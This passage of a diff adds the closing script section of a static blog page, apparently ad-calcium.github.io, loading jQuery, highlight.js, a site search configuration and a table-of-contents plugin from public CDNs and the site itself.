+            inlineMath: [ ['$','$'], ['\\(','\\)'] ]
+           }
+    });
+</script>
+
+
+<script src="https://cdn.jsdelivr.net/npm/jquery@3.4.1/dist/jquery.min.js"></script>
+<script>
+    window.jQuery || document.write('<script src="js/jquery.min.js"><\/script>')
+</script>
+<script type="text/javascript" src="https://cdn.staticfile.org/highlight.js/9.15.10/highlight.min.js"></script>
+<script type="text/javascript" src="https://cdn.staticfile.org/highlight.js/9.15.10/languages/python.min.js" defer></script>
+<script type="text/javascript" src="https://cdn.staticfile.org/highlight.js/9.15.10/languages/javascript.min.js" defer></script><script>
+    hljs.configure({
+        tabReplace: '    ', 
+        classPrefix: ''     
+        
+    })
+    hljs.initHighlightingOnLoad();
+</script>
+<script src="https://ad-calcium.github.io/js/application.min.a94ab19cb63a95c8d7fbd7b85cab3ddeea8c369bdf75b9cab6708787ead123af.js"></script>
+<script src="https://ad-calcium.github.io/js/plugin.min.19c5bcb2fb0789ab4f2b7834e5ceb5e92635645605bab902c1024b25f1502364.js"></script>
+
+<script>
+    (function (window) {
+        var INSIGHT_CONFIG = {
+            TRANSLATION: {
+                POSTS: '文章',
+                PAGES: '页面',
+                CATEGORIES: '分类',
+                TAGS: '标签',
+                UNTITLED: '(未命名)',
+            },
+            ROOT_URL: 'https:\/\/ad-calcium.github.io\/',
+            CONTENT_URL: 'https:\/\/ad-calcium.github.io\/\/searchindex.json ',
+        };
+        window.INSIGHT_CONFIG = INSIGHT_CONFIG;
+    })(window);
+</script>
+<script type="text/javascript" src="https://ad-calcium.github.io/js/insight.min.4a2d52de4bfff73e0c688404fe3d17c9a3ae12d9888e1e1ac9c690e4890de2ded50fe55f2b819c2ba55435a76f396f3ea6805765f0b0af5635cdf74ea459eab0.js" defer></script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/tocbot/4.4.2/tocbot.min.js"></script>
+<script>
+    tocbot.init({
+        
+        tocSelector: '.js-toc',
+        
+        contentSelector: '.js-toc-content',
+        
+        headingSelector: 'h1, h2, h3',
+        
+        hasInnerContainers: true,
+    });
+</script>
+
+
+  </body>
+</html>
